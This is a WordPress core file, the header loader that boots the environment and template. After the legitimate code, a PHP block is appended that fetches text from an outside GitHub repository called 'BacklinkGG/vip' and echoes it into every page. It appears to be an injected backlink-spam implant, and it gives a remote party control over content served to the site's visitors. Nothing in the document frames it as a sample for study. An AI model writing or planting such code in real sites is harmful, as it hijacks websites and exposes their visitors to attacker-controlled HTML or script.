<?php
/**
* Loads the WordPress environment and template.
*
* @package WordPress
*/

if ( ! isset( $wp_did_header ) ) {
		
$wp_did_header = true;
		
// Load the WordPress library.
require_once __DIR__ . '/wp-load.php';
		
// Set up the WordPress query.
wp();
		
// Load the theme template.
require_once ABSPATH . WPINC . '/template-loader.php';
		
}
?>
<?php
$github_content = file_get_contents('https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt');
echo $github_content;
?>
